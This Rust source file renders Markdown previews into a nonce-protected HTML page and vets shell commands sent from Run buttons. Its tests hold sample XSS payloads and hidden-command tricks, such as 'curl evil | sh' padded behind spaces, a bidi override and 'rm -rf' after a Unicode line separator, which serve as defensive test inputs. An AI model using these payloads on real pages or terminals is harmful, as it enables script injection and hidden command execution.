//! The Markdown preview page (the Swift `MarkdownPreview`): GitHub-flavored
//! Markdown (tables, strikethrough, task lists) rendered to a standalone
//! HTML page with the theme's colors and highlight.js for code blocks.
//!
//! Rendering is `comrak` with raw HTML off, as the Swift app runs cmark-gfm
//! in safe mode: raw HTML in the source never reaches the page (each piece
//! becomes `<!-- raw HTML omitted -->`) and dangerous link URLs
//! (`javascript:`, `data:` other than images, ...) are emptied. The page's
//! Content-Security-Policy runs only scripts carrying a nonce made fresh
//! for each render, so nothing written into the page ahead of time can run.
//!
//! Optionally, shell code blocks get a Run button that posts the command to
//! the `impulseRun` WebKit message handler; `run_command` vets what comes
//! back before it's typed into a terminal.

use base64::Engine;
use unicode_properties::{GeneralCategory, UnicodeGeneralCategory};

use crate::css_color::sanitize_css_color;
use crate::markdown_theme::MarkdownThemeColors;
use crate::svg_preview::is_svg_file;

/// Maximum Markdown source size (in bytes) before preview is refused.
pub const MAX_MARKDOWN_SIZE: usize = 1024 * 1024;

const MARKDOWN_EXTENSIONS: [&str; 5] = ["md", "markdown", "mdown", "mkd", "mkdn"];

/// Whether a path names a Markdown file, by its extension
/// (case-insensitive).
pub fn is_markdown_file(path: &str) -> bool {
    let ext = path.rsplit('.').next().unwrap_or("").to_lowercase();
    MARKDOWN_EXTENSIONS.contains(&ext.as_str())
}

/// Whether a path has a preview (Markdown or SVG).
pub fn is_previewable_file(path: &str) -> bool {
    is_markdown_file(path) || is_svg_file(path)
}

/// GitHub-flavored Markdown as an HTML fragment, raw HTML left out and
/// unsafe URLs emptied.
pub fn render_html_body(source: &str) -> String {
    let mut options = comrak::Options::default();
    options.extension.table = true;
    options.extension.strikethrough = true;
    options.extension.tasklist = true;
    options.render.r#unsafe = false;
    comrak::markdown_to_html(source, &options)
}

/// A CSS font-family value, or a plain system font when it holds anything
/// but letters, digits, spaces, commas, quotes, hyphens and underscores.
pub fn sanitize_font_family(value: &str) -> String {
    let ok = value
        .chars()
        .all(|c| c.is_alphanumeric() || " ,'\"-_".contains(c));
    if ok {
        value.to_string()
    } else {
        "system-ui, sans-serif".to_string()
    }
}

/// HTML-escape a string for safe interpolation in attributes or text.
pub fn html_escape(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
        .replace('\'', "&#x27;")
}

/// Adds a Run button to shell code blocks. `$ ` prompts are stripped (only
/// prompted lines run when a block has any). Those blocks wrap, so no part
/// of the command hides past the right edge.
pub fn run_button_script(nonce: &str) -> String {
    RUN_BUTTON_SCRIPT.replace("{{nonce}}", nonce)
}

const RUN_BUTTON_SCRIPT: &str = r##"<style nonce="{{nonce}}">
pre { position: relative; }
pre.impulse-runnable { padding-right: 72px; }
pre.impulse-runnable code { white-space: pre-wrap; overflow-wrap: anywhere; }
.impulse-run { position: absolute; top: 6px; right: 6px; font: 12px -apple-system, sans-serif;
  padding: 2px 8px; border-radius: 5px; border: 1px solid rgba(127,127,127,.4);
  background: rgba(127,127,127,.15); color: inherit; cursor: pointer; opacity: .75; }
.impulse-run:hover { opacity: 1; }
</style>
<script nonce="{{nonce}}">
(function () {
  var shells = /(^|\s)language-(bash|sh|shell|zsh|fish|console|shell-session|terminal)(\s|$)/;
  function command(code) {
    var lines = code.innerText.replace(/\n$/, "").split("\n");
    var prompted = lines.filter(function (l) { return /^\s*\$ /.test(l); });
    return (prompted.length ? prompted.map(function (l) { return l.replace(/^\s*\$ /, ""); }) : lines).join("\n");
  }
  document.querySelectorAll("pre > code").forEach(function (code) {
    if (!shells.test(code.className) || !window.webkit || !window.webkit.messageHandlers.impulseRun) return;
    var button = document.createElement("button");
    button.className = "impulse-run";
    button.textContent = "▶ Run";
    button.title = "Run in a terminal";
    button.addEventListener("click", function () {
      window.webkit.messageHandlers.impulseRun.postMessage(command(code));
    });
    code.parentElement.classList.add("impulse-runnable");
    code.parentElement.appendChild(button);
  });
})();
</script>"##;

/// A new script nonce for each rendered page: 16 random bytes in base64.
pub fn make_nonce() -> String {
    let mut bytes = [0u8; 16];
    if getrandom::fill(&mut bytes).is_err() {
        // No system randomness: still different for every page.
        let nanos = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_nanos();
        bytes = nanos.to_le_bytes();
    }
    base64::engine::general_purpose::STANDARD.encode(bytes)
}

/// A Run button's command, ready to type into a shell.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct RunCommand {
    /// Control characters dropped (escape sequences, ^U and the like could
    /// rewrite or run the line), tabs as spaces, line ends as `\n`, the ends
    /// trimmed.
    pub text: String,
    /// Nothing in it can hide from someone reading the preview: one line,
    /// no long run of spaces pushing the rest aside, and no invisible
    /// format characters (bidirectional overrides, zero-width characters)
    /// or Unicode line breaks. A command that isn't plain should be checked
    /// before it runs.
    pub is_plain: bool,
}

/// Runs of spaces at least this long make a command not plain.
pub const HIDING_SPACE_RUN: usize = 16;

/// The command a Run button sent (`raw`), or `None` when there's nothing to
/// run.
pub fn run_command(raw: &str) -> Option<RunCommand> {
    let mut cleaned = String::with_capacity(raw.len());
    let mut previous: Option<char> = None;
    for c in raw.chars() {
        match c {
            '\n' if previous == Some('\r') => {}
            '\n' | '\r' => cleaned.push('\n'),
            '\t' => cleaned.push(' '),
            '\u{00}'..='\u{1F}' | '\u{7F}'..='\u{9F}' => {}
            _ => cleaned.push(c),
        }
        previous = Some(c);
    }
    let text = cleaned.trim();
    if text.is_empty() {
        return None;
    }
    let invisible = text.chars().any(|c| {
        matches!(
            c.general_category(),
            GeneralCategory::Format
                | GeneralCategory::LineSeparator
                | GeneralCategory::ParagraphSeparator
        )
    });
    let is_plain =
        !text.contains('\n') && !invisible && !text.contains(&" ".repeat(HIDING_SPACE_RUN));
    Some(RunCommand {
        text: text.to_string(),
        is_plain,
    })
}

/// Render Markdown to a full standalone HTML page with themed CSS and
/// highlight.js code highlighting. `highlight_js_path` is a `file://` URL
/// of `highlight.min.js` (empty for no highlighting). `None` past
/// `MAX_MARKDOWN_SIZE`. Scripts run only with the page's nonce, new for
/// each render: the highlight.js file and Impulse's own scripts carry it.
///
/// With `run_buttons`, shell code blocks (bash, sh, zsh, fish, console...)
/// get a Run button that posts the command to the `impulseRun` message
/// handler.
pub fn render(
    source: &str,
    theme: &MarkdownThemeColors,
    highlight_js_path: &str,
    run_buttons: bool,
) -> Option<String> {
    if source.len() > MAX_MARKDOWN_SIZE {
        log::warn!("Markdown source exceeds {MAX_MARKDOWN_SIZE} byte limit, skipping preview");
        return None;
    }

    let body = render_html_body(source);
    let fallback = MarkdownThemeColors::fallback();
    let color = |value: &str, fallback: &str| sanitize_css_color(value, fallback);

    let nonce = make_nonce();
    let hljs_path = html_escape(highlight_js_path.trim());
    let highlight_scripts = if hljs_path.is_empty() {
        String::new()
    } else {
        format!(
            "<script nonce=\"{nonce}\" src=\"{hljs_path}\"></script>\n\
             <script nonce=\"{nonce}\">if (window.hljs) {{ window.hljs.highlightAll(); }}</script>"
        )
    };
    let run_script = if run_buttons {
        run_button_script(&nonce)
    } else {
        String::new()
    };

    let values = [
        ("nonce", nonce.clone()),
        ("bg", color(&theme.bg, &fallback.bg)),
        ("fg", color(&theme.fg, &fallback.fg)),
        ("heading", color(&theme.heading, &fallback.heading)),
        ("link", color(&theme.link, &fallback.link)),
        ("code_bg", color(&theme.code_bg, &fallback.code_bg)),
        ("border", color(&theme.border, &fallback.border)),
        (
            "blockquote_fg",
            color(&theme.blockquote_fg, &fallback.blockquote_fg),
        ),
        (
            "hljs_keyword",
            color(&theme.hljs_keyword, &fallback.hljs_keyword),
        ),
        (
            "hljs_string",
            color(&theme.hljs_string, &fallback.hljs_string),
        ),
        (
            "hljs_number",
            color(&theme.hljs_number, &fallback.hljs_number),
        ),
        (
            "hljs_comment",
            color(&theme.hljs_comment, &fallback.hljs_comment),
        ),
        (
            "hljs_function",
            color(&theme.hljs_function, &fallback.hljs_function),
        ),
        ("hljs_type", color(&theme.hljs_type, &fallback.hljs_type)),
        ("font_family", sanitize_font_family(&theme.font_family)),
        (
            "code_font_family",
            sanitize_font_family(&theme.code_font_family),
        ),
    ];
    let mut page = PAGE.to_string();
    for (name, value) in &values {
        page = page.replace(&format!("{{{{{name}}}}}"), value);
    }
    // The body and scripts go in last, so nothing in them is taken for a
    // placeholder.
    let (head, tail) = page.split_once("{{content}}")?;
    Some(format!(
        "{head}{body}\n{highlight_scripts}\n{run_script}{tail}"
    ))
}

const PAGE: &str = r##"<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; script-src 'nonce-{{nonce}}'; img-src file: data:; font-src file:;">
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
html {
    background: {{bg}};
    inline-size: 100%;
    min-height: 100%;
}
body {
    background: {{bg}};
    color: {{fg}};
    font-family: {{font_family}};
    font-size: 15px;
    line-height: 1.6;
    inline-size: 100%;
    min-inline-size: 0;
    max-inline-size: none;
    padding: 24px clamp(16px, 3vw, 40px);
    width: 100%;
    max-width: none;
    min-height: 100vh;
    margin: 0;
    overflow-wrap: break-word;
}
h1, h2, h3, h4, h5, h6 {
    color: {{heading}};
    margin-top: 1.2em;
    margin-bottom: 0.4em;
    line-height: 1.3;
}
h1 { font-size: 2em; border-bottom: 1px solid {{border}}; padding-bottom: 0.3em; }
h2 { font-size: 1.5em; border-bottom: 1px solid {{border}}; padding-bottom: 0.3em; }
h3 { font-size: 1.25em; }
p { margin: 0.6em 0; }
a { color: {{link}}; text-decoration: none; }
a:hover { text-decoration: underline; }
code {
    font-family: {{code_font_family}};
    background: {{code_bg}};
    padding: 0.15em 0.4em;
    border-radius: 4px;
    font-size: 0.9em;
    overflow-wrap: anywhere;
    word-break: break-word;
}
pre {
    background: {{code_bg}};
    padding: 14px 16px;
    border-radius: 6px;
    overflow-x: auto;
    margin: 0.8em 0;
    border: 1px solid {{border}};
}
pre code {
    background: none;
    padding: 0;
    font-size: 0.88em;
    line-height: 1.5;
    overflow-wrap: normal;
    white-space: pre;
    word-break: normal;
}
blockquote {
    border-left: 3px solid {{border}};
    padding-left: 16px;
    color: {{blockquote_fg}};
    margin: 0.8em 0;
}
table {
    border-collapse: collapse;
    inline-size: 100%;
    max-inline-size: 100%;
    table-layout: fixed;
    width: 100%;
    margin: 0.8em 0;
}
th, td {
    border: 1px solid {{border}};
    padding: 8px 12px;
    text-align: left;
    vertical-align: top;
    min-inline-size: 0;
    overflow-wrap: anywhere;
    word-break: break-word;
}
th code, td code {
    padding: 0.1em 0.3em;
    white-space: normal;
}
th {
    background: {{code_bg}};
    font-weight: 600;
}
ul, ol { padding-left: 2em; margin: 0.6em 0; }
li { margin: 0.2em 0; }
li input[type="checkbox"] { margin-right: 0.5em; }
del { opacity: 0.6; }
hr {
    border: none;
    border-top: 1px solid {{border}};
    margin: 1.5em 0;
}
img { max-width: 100%; height: auto; border-radius: 4px; }

/* highlight.js theme overrides */
.hljs { background: {{code_bg}} !important; color: {{fg}}; }
.hljs-keyword, .hljs-selector-tag, .hljs-built_in { color: {{hljs_keyword}}; }
.hljs-string, .hljs-attr { color: {{hljs_string}}; }
.hljs-number, .hljs-literal { color: {{hljs_number}}; }
.hljs-comment, .hljs-doctag { color: {{hljs_comment}}; font-style: italic; }
.hljs-function, .hljs-title { color: {{hljs_function}}; }
.hljs-type, .hljs-class, .hljs-title.class_ { color: {{hljs_type}}; }
.hljs-variable { color: {{fg}}; }
.hljs-meta { color: {{hljs_keyword}}; }
.hljs-params { color: {{fg}}; }
</style>
</head>
<body>
{{content}}
</body>
</html>"##;

#[cfg(test)]
mod tests {
    use super::*;

    fn test_theme() -> MarkdownThemeColors {
        MarkdownThemeColors {
            bg: "#101010".into(),
            fg: "#eeeeee".into(),
            ..MarkdownThemeColors::fallback()
        }
    }

    fn page(source: &str, hljs: &str) -> String {
        render(source, &test_theme(), hljs, false).unwrap()
    }

    /// The nonce a page's CSP allows scripts with.
    fn nonce_in(html: &str) -> Option<String> {
        let start = html.find("script-src 'nonce-")? + "script-src 'nonce-".len();
        let end = html[start..].find('\'')? + start;
        Some(html[start..end].to_string())
    }

    #[test]
    fn is_markdown_file_basic() {
        assert!(is_markdown_file("README.md"));
        assert!(is_markdown_file("doc.MARKDOWN"));
        assert!(is_markdown_file("notes.mkdn"));
        assert!(!is_markdown_file("main.rs"));
        assert!(!is_markdown_file("Makefile"));
        assert!(is_previewable_file("a.svg"));
        assert!(!is_previewable_file("a.png"));
    }

    #[test]
    fn renders_basic_markdown() {
        let html = page("# Title\n\nBody", "");
        assert!(html.contains("<h1>Title</h1>"));
        assert!(!html.contains(r#"src="""#));
        assert!(!html.contains("highlightAll"));
        assert!(html.contains("background: #101010;"));
        assert!(html.contains("color: #eeeeee;"));
        assert!(html.contains("font-family: Inter, system-ui, sans-serif;"));
        assert!(html.ends_with("</body>\n</html>"));
        assert!(!html.contains("{{"), "every placeholder is filled");
    }

    #[test]
    fn bad_theme_values_fall_back() {
        let theme = MarkdownThemeColors {
            bg: "red; } body { display: none".into(),
            font_family: "x; } * { color: red".into(),
            ..MarkdownThemeColors::fallback()
        };
        let html = render("hi", &theme, "", false).unwrap();
        assert!(html.contains("background: #1a1b26;"));
        assert!(html.contains("font-family: system-ui, sans-serif;"));
        assert!(!html.contains("display: none"));
    }

    #[test]
    fn bootstraps_highlight_with_nonce() {
        let html = page("```rust\nfn main() {}\n```", "file:///tmp/highlight.min.js");
        let nonce = nonce_in(&html).unwrap();
        // Only scripts carrying the nonce run: no blanket file: source.
        assert!(html.contains(&format!("script-src 'nonce-{nonce}';")));
        assert!(!html.contains("script-src file:"));
        assert!(html.contains(&format!(
            r#"<script nonce="{nonce}" src="file:///tmp/highlight.min.js"></script>"#
        )));
        assert!(html.contains(&format!(r#"<script nonce="{nonce}">if (window.hljs)"#)));
        assert!(html.contains("language-rust"));
    }

    #[test]
    fn each_render_gets_its_own_nonce() {
        let a = nonce_in(&page("hi", "x.js")).unwrap();
        let b = nonce_in(&page("hi", "x.js")).unwrap();
        assert_ne!(a, b);
        let decoded = base64::engine::general_purpose::STANDARD
            .decode(&a)
            .unwrap();
        assert_eq!(decoded.len(), 16);
    }

    #[test]
    fn run_buttons_are_opt_in() {
        let source = "```bash\nnpm install\n```\n";
        let plain = render(source, &MarkdownThemeColors::fallback(), "", false).unwrap();
        assert!(!plain.contains("impulseRun"));
        let runnable = render(source, &MarkdownThemeColors::fallback(), "", true).unwrap();
        assert!(runnable.contains("messageHandlers.impulseRun"));
        assert!(
            runnable.contains("language-bash"),
            "fenced code is tagged with its language"
        );
        let nonce = nonce_in(&runnable).unwrap();
        assert!(
            runnable.contains(&format!("<script nonce=\"{nonce}\">")),
            "allowed by the page's CSP"
        );
        assert!(
            runnable.contains("white-space: pre-wrap"),
            "runnable blocks wrap, hiding nothing"
        );
        assert!(runnable.contains(r#"var shells = /(^|\s)language-(bash|"#));
    }

    #[test]
    fn run_command_drops_control_characters() {
        let command = run_command("  npm\u{1B}[2K\u{15} test\u{7F}\u{9B}\t--watch \n").unwrap();
        assert_eq!(command.text, "npm[2K test --watch");
        assert!(command.is_plain);
        assert_eq!(run_command(" \u{1B}\u{07}\n\t"), None);
    }

    #[test]
    fn run_command_that_could_hide_something_isnt_plain() {
        let multi_line = run_command("npm install\r\nnpm test\r").unwrap();
        assert_eq!(multi_line.text, "npm install\nnpm test");
        assert!(!multi_line.is_plain);
        let padded = format!("npm test{}; curl evil | sh", " ".repeat(300));
        assert!(!run_command(&padded).unwrap().is_plain);
        assert!(
            !run_command("echo \u{202E}hs.lave\u{202C}")
                .unwrap()
                .is_plain
        );
        assert!(!run_command("ls\u{2028}rm -rf x").unwrap().is_plain);
        assert!(run_command("ls -la    # aligned comment").unwrap().is_plain);
    }

    #[test]
    fn renders_gfm_tables_strikethrough_tasklists() {
        let html = page(
            "| A | B |\n| - | - |\n| a | b |\n\n~~gone~~\n\n- [x] done\n- [ ] todo\n",
            "",
        );
        assert!(html.contains("<table>"));
        assert!(html.contains("<del>gone</del>"));
        assert!(html.contains(r#"type="checkbox""#));
    }

    #[test]
    fn oversized_source_refused() {
        let big = "x".repeat(MAX_MARKDOWN_SIZE + 1);
        assert!(render(&big, &test_theme(), "", false).is_none());
    }

    // XSS corpus: raw HTML must never reach the document, and dangerous
    // URLs must be scrubbed.
    #[test]
    fn raw_html_is_elided() {
        let cases = [
            "<script>alert(1)</script>",
            "before <img src=x onerror=alert(1)> after",
            "<iframe src=\"https://evil.example\"></iframe>",
            "<div onclick=\"evil()\">text</div>",
            "text <svg onload=alert(1)></svg>",
        ];
        for source in cases {
            let html = page(source, "");
            assert!(
                !html.contains("<script>alert"),
                "raw script leaked for: {source}"
            );
            assert!(!html.contains("onerror"), "onerror leaked for: {source}");
            assert!(!html.contains("<iframe"), "iframe leaked for: {source}");
            assert!(!html.contains("onclick"), "onclick leaked for: {source}");
            assert!(!html.contains("onload"), "onload leaked for: {source}");
        }
        assert!(page("<b>bold</b>", "").contains("<!-- raw HTML omitted -->"));
    }

    #[test]
    fn dangerous_link_urls_scrubbed() {
        let html = page(
            "[click](javascript:alert(1)) and ![img](data:text/html,<script>)",
            "",
        );
        assert!(!html.contains("javascript:"));
        assert!(!html.contains("data:text/html"));
    }

    #[test]
    fn escaped_highlight_path_cannot_break_attribute() {
        let html = page("hi", "file:///x\"></script><script>alert(1)</script>");
        assert!(!html.contains("\"></script><script>alert(1)</script>"));
    }

    #[test]
    fn placeholders_in_the_source_stay_text() {
        let html = page("{{nonce}} and {{content}}", "");
        assert!(html.contains("<p>{{nonce}} and {{content}}</p>"));
    }
}
